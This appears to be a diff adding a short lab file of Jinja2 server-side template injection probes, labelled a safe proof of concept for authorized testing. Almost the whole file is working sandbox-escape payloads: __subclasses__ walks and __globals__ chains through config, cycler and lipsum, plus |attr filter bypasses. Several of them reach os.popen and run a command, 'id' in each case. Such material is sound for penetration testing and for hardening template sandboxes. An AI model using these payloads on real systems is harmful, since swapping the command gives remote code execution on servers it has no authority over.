@@ -1,0 +1,24 @@
+## {{ Safe PoC -> x8bitranjit }}
+## Benign lab file - x8bitranjit style. Authorized security testing only.
+##
+## WHAT THIS DEMONSTRATES: Jinja2 SandboxedEnvironment (jinja2.sandbox) escapes.
+## A sandboxed Jinja (used by many CMS/plugin 'safe template' features) blocks
+## direct dunder access - these probes walk the immutable object graph instead.
+##
+## PROBE 1 - attribute walker (does the sandbox actually block dunders?):
+{{ ''.__class__ }}                      {# blocked in sandbox = muted attr policy #}
+{{ ''|attr('__class__') }}              {# |attr often bypasses the policy #}
+##
+## PROBE 2 - the classic sandbox walk (find _wrap_close / warnings via subclasses):
+{{ ().__class__.__bases__[0].__subclasses__() }}
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}  {# if config exposed #}
+##
+## PROBE 3 - str.format gadget (safe_join bypass family):
+{{ '%s'|format(self._TemplateReference__context) }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+##
+## PROBE 4 - attribute-filter bypass via |attr chain:
+{{ lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('id')|attr('read')() }}
+##
+## Benign rule: id/echo as the only command; never exfiltrate in the PoC.
+## KIT CROSS-REF: SSTI_CHECKLIST SSTI-034/035 (sandbox + filter bypass rows).
